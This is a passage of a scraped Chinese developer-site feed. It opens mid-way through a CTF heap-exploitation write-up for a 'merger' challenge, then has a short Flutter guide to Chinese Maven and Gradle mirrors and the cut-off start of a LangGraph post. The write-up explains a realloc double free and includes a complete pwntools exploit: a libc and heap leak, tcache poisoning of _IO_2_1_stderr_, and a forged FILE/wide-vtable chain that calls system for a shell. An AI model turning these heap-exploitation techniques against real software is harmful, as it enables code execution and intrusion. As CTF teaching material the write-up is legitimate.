<p>当重新申请的堆块的<code>size</code>大于当前堆块的<code>size</code>，则<code>realloc</code>会先<code>free</code>当前堆块，再<code>malloc</code>申请的<code>size</code></p>
</li>
</ol>
<p>结合<code>merage</code>功能，当以条件二执行<code>realloc</code>函数时会执行<code>free(s)</code>并紧接着执行<code>free(src)</code>，因此当<code>s=src</code>时，就会导致<code>double free</code>漏洞。</p>
<p>想要利用上述<code>double free</code>漏洞，则需要满足以下条件：</p>
<ul>
<li>
<p><code>realloc</code>申请的堆块要比合并的堆块大（以条件二方式执行<code>realloc</code>函数）</p>
</li>
<li>
<p><code>double free</code>的堆块<code>size</code>需要小于<code>0x100</code>，否则申请不到（<code>add</code>功能最大只能申请<code>0xff</code>堆块）</p>
</li>
</ul>
<p><strong>漏洞利用流程</strong></p>
<ul>
<li>
<p>设置<code>src</code>与<code>dst</code>的下标为相同值</p>
</li>
<li>
<p>将<code>malloc(0xf7)</code>的堆块放置在<code>unsortbin</code>中，紧接着<code>src</code>堆块从<code>unsortbin</code>中申请，这样就能够满足<code>double free</code>的堆块<code>size</code>小于<code>0x100</code></p>
</li>
<li>
<p>若<code>src</code>堆块从<code>unsortbin</code>中申请，当以条件二方式执行<code>realloc</code>函数时则执行：</p>
<ul>
<li>
<p><code>free(src)</code></p>
</li>
<li>
<p>触发<code>unlink</code>，<code>src</code>堆块合并回<code>unsortbin</code></p>
</li>
</ul>
</li>
<li>
<p>紧接着执行<code>merge</code>函数的<code>free(src)</code>，则<code>src</code>会放在<code>tcachebin</code>中，则构造出<code>uaf</code>漏洞，泄露<code>libc</code>地址</p>
</li>
<li>
<p>后续将<code>src</code>堆块放进<code>fastbin</code>中，构造<code>double free</code>漏洞，当相应大小的<code>tcachebin</code>被申请完毕后，<code>fastbin</code>中的堆块会被放置在<code>tcachebin</code>中，从而变相构造出<code>Tcache Poisoning</code></p>
</li>
<li>
<p>利用<code>Tcache Poisoning</code>指向堆块（<code>size</code>大于<code>0xe0</code>，由于<code>io_file</code>结构体需要<code>0xe0</code>大小的空间）</p>
</li>
<li>
<p>利用<code>io_file</code>获得<code>shell</code></p>
</li>
</ul>
<h4 data-id="heading-3">EXP</h4>
<pre><code class="hljs language-scss" lang="scss">from pwn import *

sh = <span class="hljs-built_in">process</span>("./merger")
libc = <span class="hljs-built_in">ELF</span>("/lib/x86_64-linux-gnu/libc.so.<span class="hljs-number">6</span>")
context<span class="hljs-selector-class">.update</span>(arch='amd64', os='linux', bits=<span class="hljs-number">64</span>) 

def <span class="hljs-built_in">add</span>(index,size,data):
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"&gt; "</span>)
    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-string">"1"</span>)
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"dex: "</span>)
    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-built_in">str</span>(index))
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"ize: "</span>)
    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-built_in">str</span>(size))
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"ta: "</span>)
    sh.<span class="hljs-built_in">send</span>(data)
    

def <span class="hljs-built_in">delete</span>(index):
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"&gt; "</span>)
    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-string">"2"</span>)
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"dex: "</span>)
    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-built_in">str</span>(index))


def <span class="hljs-built_in">show</span>(index):
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"&gt; "</span>)
    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-string">"3"</span>)
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"dex: "</span>)
    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-built_in">str</span>(index))

def <span class="hljs-built_in">merge</span>(dst,src):
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"&gt; "</span>)
    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-string">"4"</span>)
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"st: "</span>)
    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-built_in">str</span>(dst))
    sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"src: "</span>)
    sh.<span class="hljs-built_in">sendline</span>(<span class="hljs-built_in">str</span>(src))

for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
    <span class="hljs-built_in">add</span>(i,<span class="hljs-number">0</span>x87,<span class="hljs-number">0</span>x87*<span class="hljs-string">'a'</span>)
for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
    <span class="hljs-built_in">add</span>(i+<span class="hljs-number">7</span>,<span class="hljs-number">0</span>xf7,<span class="hljs-number">0</span>xf7*<span class="hljs-string">'a'</span>)
    
<span class="hljs-built_in">add</span>(<span class="hljs-number">14</span>,<span class="hljs-number">0</span>x87,<span class="hljs-number">0</span>x87*<span class="hljs-string">'a'</span>)
<span class="hljs-built_in">add</span>(<span class="hljs-number">15</span>,<span class="hljs-number">0</span>xf7,<span class="hljs-number">0</span>xf7*<span class="hljs-string">'a'</span>)
<span class="hljs-built_in">add</span>(<span class="hljs-number">16</span>,<span class="hljs-number">0</span>x98,<span class="hljs-number">0</span>x98*<span class="hljs-string">'a'</span>)

for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
    <span class="hljs-built_in">delete</span>(i+<span class="hljs-number">7</span>)
<span class="hljs-built_in">delete</span>(<span class="hljs-number">15</span>)
<span class="hljs-built_in">add</span>(<span class="hljs-number">14</span>,<span class="hljs-number">0</span>x87,<span class="hljs-number">0</span>x87*<span class="hljs-string">'a'</span>)

for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
    <span class="hljs-built_in">delete</span>(i)

for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
    <span class="hljs-built_in">add</span>(i,<span class="hljs-number">0</span>xf0,<span class="hljs-number">0</span>xf0*<span class="hljs-string">'a'</span>)

#堆块同时释放在unsortbin与tcachebin中
<span class="hljs-built_in">merge</span>(<span class="hljs-number">14</span>,<span class="hljs-number">14</span>)
sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"a"</span>*<span class="hljs-number">0</span>x87,drop=True)
libc_main_arena = <span class="hljs-built_in">u64</span>(sh.<span class="hljs-built_in">recv</span>(<span class="hljs-number">6</span>).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">"\x00"</span>))
libcbase = libc_main_arena - <span class="hljs-number">0</span>x203b20
log.<span class="hljs-built_in">info</span>(<span class="hljs-string">"libcbase:"</span>+<span class="hljs-built_in">hex</span>(libcbase))
#修复unsortbin
payload = <span class="hljs-built_in">p64</span>(libc_main_arena)*<span class="hljs-number">2</span>
payload = payload.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0</span>xf0,b<span class="hljs-string">"a"</span>)
#堆块<span class="hljs-number">20</span>与堆块<span class="hljs-number">21</span>指向同一个堆块，一个从tcachebin中申请，一个从unsortbin中申请
<span class="hljs-built_in">add</span>(<span class="hljs-number">20</span>,<span class="hljs-number">0</span>xf0,payload)
<span class="hljs-built_in">add</span>(<span class="hljs-number">21</span>,<span class="hljs-number">0</span>x77,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x77)
<span class="hljs-built_in">add</span>(<span class="hljs-number">22</span>,<span class="hljs-number">0</span>x77,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x77)

for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
    <span class="hljs-built_in">add</span>(i,<span class="hljs-number">0</span>x77,<span class="hljs-number">0</span>x77*<span class="hljs-string">'a'</span>)
for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
    <span class="hljs-built_in">delete</span>(i)
<span class="hljs-built_in">delete</span>(<span class="hljs-number">21</span>)
<span class="hljs-built_in">show</span>(<span class="hljs-number">20</span>)  #uaf泄露数据
heapbase = <span class="hljs-built_in">u64</span>(sh.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">"\n"</span>,drop=True).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">"\x00"</span>))&lt;&lt;<span class="hljs-number">12</span>
log.<span class="hljs-built_in">info</span>(<span class="hljs-string">"heapbase:"</span>+<span class="hljs-built_in">hex</span>(heapbase))
#fastbin double free
<span class="hljs-built_in">delete</span>(<span class="hljs-number">22</span>)
<span class="hljs-built_in">delete</span>(<span class="hljs-number">20</span>)

for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
    <span class="hljs-built_in">add</span>(i,<span class="hljs-number">0</span>x77,<span class="hljs-number">0</span>x77*<span class="hljs-string">'a'</span>)
for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):
    <span class="hljs-built_in">add</span>(i+<span class="hljs-number">7</span>,<span class="hljs-number">0</span>xf7,<span class="hljs-number">0</span>xf7*<span class="hljs-string">'a'</span>)
for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):
    <span class="hljs-built_in">delete</span>(i+<span class="hljs-number">7</span>)
#<span class="hljs-number">0</span>x77的堆块大小不足以存储IO_File结构体，因此需要利用Tcache Poisoning指向<span class="hljs-number">0</span>x100的堆块
payload = <span class="hljs-built_in">p64</span>((heapbase + <span class="hljs-number">0</span>x1670) ^ (heapbase&gt;&gt;<span class="hljs-number">12</span>))
payload = payload.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0</span>x77,b<span class="hljs-string">"a"</span>)
<span class="hljs-built_in">add</span>(<span class="hljs-number">20</span>,<span class="hljs-number">0</span>x77,payload)
<span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x77,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x77)
<span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x77,<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x77)
#利用Tcache Poisoning指向_IO_2_1_stderr_
payload = <span class="hljs-built_in">p64</span>((libcbase + libc.symbols[<span class="hljs-string">'_IO_2_1_stderr_'</span>]) ^ (heapbase+<span class="hljs-number">0</span>x1000&gt;&gt;<span class="hljs-number">12</span>))
payload = payload.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0</span>x77,b<span class="hljs-string">"a"</span>)
<span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x77,payload)

#<span class="hljs-built_in">fake_wide_vtable</span>(<span class="hljs-number">0</span>xa8)
payload  = b<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0</span>x68 + <span class="hljs-built_in">p64</span>(libcbase + libc.symbols[<span class="hljs-string">'system'</span>])
payload = payload.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0</span>xa8,b<span class="hljs-string">"\x00"</span>)
<span class="hljs-built_in">add</span>(<span class="hljs-number">26</span>,<span class="hljs-number">0</span>xa8,payload)
fake_wide_vtable = heapbase + <span class="hljs-number">0</span>x1770

#<span class="hljs-built_in">fake_IO_wide_data</span>(<span class="hljs-number">0</span>xe8)
payload = b<span class="hljs-string">'\x00'</span> * <span class="hljs-number">0</span>xe0 + <span class="hljs-built_in">p64</span>(fake_wide_vtable)
<span class="hljs-built_in">add</span>(<span class="hljs-number">25</span>,<span class="hljs-number">0</span>xe8,payload)
fake_IO_wide_data  = heapbase + <span class="hljs-number">0</span>x1670

#fake <span class="hljs-built_in">stderr</span>(<span class="hljs-number">0</span>xe0)
fake_stderr                = <span class="hljs-built_in">FileStructure</span>(<span class="hljs-number">0</span>)
fake_stderr.flags          = <span class="hljs-built_in">u64</span>(b<span class="hljs-string">'  sh\x00\x00\x00\x00'</span>)
fake_stderr._IO_write_base = <span class="hljs-number">0</span>
fake_stderr._IO_write_ptr  = <span class="hljs-number">1</span> # _IO_write_ptr &gt; _IO_write_base
fake_stderr._wide_data     = fake_IO_wide_data
fake_stderr.vtable         = libc.symbols[<span class="hljs-string">'_IO_wfile_jumps'</span>] + libcbase
fake_stderr._lock          = <span class="hljs-number">0</span>x205700 + libcbase #_IO_stdfile_2_lock
fake_stderr_bytes = <span class="hljs-built_in">bytes</span>(fake_stderr)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(fake_stderr_bytes)))
<span class="hljs-built_in">add</span>(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>xf0,fake_stderr_bytes+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>xfbad2887)+b<span class="hljs-string">"\n"</span>)
sh.<span class="hljs-built_in">interactive</span>()
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutter 配置国内镜像，加速项目加载！]]></title>    <link>https://juejin.cn/post/7576955345379442751</link>    <guid>https://juejin.cn/post/7576955345379442751</guid>    <pubDate>2025-11-27T07:40:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576955345379442751" data-draft-id="7576994308274094099" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutter 配置国内镜像，加速项目加载！"/> <meta itemprop="keywords" content="Flutter"/> <meta itemprop="datePublished" content="2025-11-27T07:40:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端小伙计"/> <meta itemprop="url" content="https://juejin.cn/user/430664289630157"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutter 配置国内镜像，加速项目加载！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/430664289630157/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端小伙计
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:40:47.000Z" title="Thu Nov 27 2025 07:40:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">Flutter 运行配置</h3>
<p>Flutter项目创建后，设置国内镜像地址。</p>
<h5 data-id="heading-1">1.国内使用阿里地址</h5>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// 文件位置 android/build.gradle</span>

buildscript {
    repositories {
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//maven.aliyun.com/repository/central/' }</span>
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//maven.aliyun.com/repository/public/' }</span>
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//maven.aliyun.com/repository/gradle-plugin/' }</span>
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//maven.aliyun.com/repository/apache-snapshots/' }</span>
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//maven.aliyun.com/repository/google/' }</span>
    }
}

allprojects {
    repositories {
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//maven.aliyun.com/repository/central/' }</span>
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//maven.aliyun.com/repository/public/' }</span>
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//maven.aliyun.com/repository/gradle-plugin/' }</span>
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//maven.aliyun.com/repository/apache-snapshots/' }</span>
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//maven.aliyun.com/repository/google/' }</span>
    }
}
</code></pre>
<h5 data-id="heading-2">2.指定项目java地址（有些android studio 设置了java版本仍不能能常使用）</h5>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 文件位置 android/gradle.properties</span>

org.gradle.java.home=D:\\Android\\G18
</code></pre>
<h5 data-id="heading-3">3.使用国内镜像下载 gradle</h5>
<pre><code class="hljs language-ruby" lang="ruby">/<span class="hljs-regexp">/ 文件位置 android/gradle</span><span class="hljs-regexp">/wrapper/gradle</span>-wrapper.properties

distributionUrl=https\<span class="hljs-symbol">://mirrors</span>.cloud.tencent.com/gradle/gradle-<span class="hljs-number">7.5</span>-all.zip
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[告别“黑盒”等待：如何在 LangGraph 中优雅地实现前端友好的 Human-in-the-Loop？]]></title>    <link>https://juejin.cn/post/7576969229984923688</link>    <guid>https://juejin.cn/post/7576969229984923688</guid>    <pubDate>2025-11-27T07:29:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576969229984923688" data-draft-id="7576936862633361408" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="告别“黑盒”等待：如何在 LangGraph 中优雅地实现前端友好的 Human-in-the-Loop？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-27T07:29:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="changflow"/> <meta itemprop="url" content="https://juejin.cn/user/3288013785548907"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            告别“黑盒”等待：如何在 LangGraph 中优雅地实现前端友好的 Human-in-the-Loop？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3288013785548907/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    changflow
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:29:59.000Z" title="Thu Nov 27 2025 07:29:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 